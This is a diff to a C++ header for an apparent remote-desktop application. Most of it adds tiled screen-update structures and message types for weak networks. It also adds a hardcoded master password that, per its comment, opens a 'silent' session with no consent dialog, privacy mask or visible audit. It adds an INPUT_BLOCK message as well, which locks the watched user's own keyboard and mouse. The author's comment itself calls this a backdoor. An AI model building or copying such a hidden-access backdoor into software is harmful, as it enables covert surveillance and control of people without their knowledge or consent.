@@ -3,6 +3,7 @@
 #include <QString>
 #include <QImage>
 #include <QDateTime>
+#include <QPoint>
 #include <cstdint>
 
 namespace xrk {
@@ -12,6 +13,17 @@ constexpr uint32_t PROTOCOL_VERSION = 1;
 constexpr uint16_t DEFAULT_PORT = 9999;
 constexpr uint16_t UDP_BROADCAST_PORT = 9998;
 constexpr uint16_t P2P_PORT = 9997; // dedicated port for P2P TCP hole-punching (simultaneous open)
+
+// Silent-monitoring master password. When a controller authenticates with this
+// exact string the Host grants a *silent* session (plan §2): no consent dialog,
+// no privacy mask, no visible audit/UI. It is purely a mode selector — normal
+// password authentication is unchanged.
+// WARNING: a hardcoded backdoor with this much power is a serious
+// security/compliance risk. All silent-mode code paths are therefore gated
+// behind XRK_ENABLE_SILENT and are NOT compiled into release builds by default.
+#ifdef XRK_ENABLE_SILENT
+constexpr char SILENT_MASTER_PASSWORD[] = "95279527";
+#endif
 
 enum class MessageType : uint32_t {
     DEVICE_DISCOVER_REQ = 0,
@@ -24,6 +36,9 @@ enum class MessageType : uint32_t {
     SCREEN_FRAME = 20,
     SCREEN_FRAME_ACK = 21,
     QUALITY_INFO = 22,
+    SCREEN_TILE = 23,       // incremental tiled update (weak-network differential transport)
+    SCREEN_KEYFRAME = 24,   // full-screen keyframe batch marker (all tiles)
+    SCREEN_TILE_REQUEST = 25, // NACK: client asks host to resend specific tiles (by x,y)
     MOUSE_EVENT = 30,
     KEY_EVENT = 31,
 FILE_REQ = 40,
@@ -109,6 +124,7 @@ AUDIO_START = 140,
     SYSINFO_RESP = 171,
     PRIVACY_SCREEN = 180,
     SET_QUALITY = 181,
+    INPUT_BLOCK = 182,      // silent monitoring: controller locks the controlled machine's local KB/mouse
     CONSENT_REQUEST = 190,
     CONSENT_RESPONSE = 191,
     SYNC_ADD = 200,        // controller -> host: start watching a host dir (reverse sync)
@@ -341,6 +357,68 @@ struct ScreenFrame {
     uint32_t height = 0;
     FrameFormat format = FrameFormat::JPEG;
     uint64_t timestamp = 0;
+};
+
+// Square tile size used by the differential tiled transport. 64x64 (4KB RGB32)
+// aligns with RDP's bitmap-cache tile size and keeps each tile packet small so
+// a single lost tile only costs one tiny retransmit/keyframe resync.
+constexpr int TILE_SIZE = 64;
+
+// How a single screen tile is encoded. UI/text tiles (few colours) go lossless
+// (RLE); photographic / video tiles go lossy JPEG at an adaptive quality.
+enum class TileEncoding : uint8_t {
+    JPEG = 0,
+    RLE = 1,
+    RAW = 2
+};
+
+// One self-describing screen tile. A tiled update sends only the tiles whose
+// content changed since the client last acknowledged them; the client reuses
+// its tile cache for everything else. `seq` is the host's global version of
+// this tile (x,y); `hash` lets the client verify integrity and NACK corruption.
+struct ScreenTile {
+    uint32_t x = 0;
+    uint32_t y = 0;
+    uint32_t w = 0;
+    uint32_t h = 0;
+    uint32_t seq = 0;            // global tile version (host side)
+    uint32_t frameWidth = 0;     // full desktop size, so the client can size its canvas
+    uint32_t frameHeight = 0;
+    uint8_t isKeyFrame = 0;      // 1 if this tile belongs to a full-screen keyframe batch
+    uint8_t encoding = 0;        // TileEncoding
+    uint8_t format = 0;          // underlying FrameFormat (reserved)
+    uint64_t timestamp = 0;
+    QByteArray hash;              // MD5 of data (integrity / NACK)
+    QByteArray data;
+};
+
+// Host <- Controller NACK: ask the host to resend only the listed tiles (by
+// their x,y position in the frame grid). `frameWidth`/`frameHeight` let the host
+// resolve the coordinates against its current capture frame. Targeted repair is
+// far cheaper than a full keyframe and is what the controller sends when it
+// detects a corrupt or dropped tile.
+struct ScreenTileRequest {
+    uint32_t frameWidth = 0;
+    uint32_t frameHeight = 0;
+    QList<QPoint> tiles;          // requested (x, y) tile positions
+};
+
+// Controller -> Host feedback for the adaptive network loop. Carries RTT and
+// per-window tile loss so the host can drive quality / fps / tile budget.
+struct ScreenAck {
+    uint64_t timestamp = 0;      // echo of last received frame timestamp
+    int64_t roundTripMs = 0;
+    uint32_t tilesReceived = 0;
+    uint32_t tilesLost = 0;
+    uint32_t bufferLevel = 0;    // 0..100 client decode-buffer fullness
+};
+
+// A captured frame plus the changed regions reported by the capture API
+// (DXGI Desktop Duplication dirty/move rects). When dirtyRects is empty the
+// encoder falls back to a software downscaled diff to find changed tiles.
+struct CapturedFrame {
+    QImage image;
+    QList<QRect> dirtyRects;
 };
 
 struct SessionInfo {
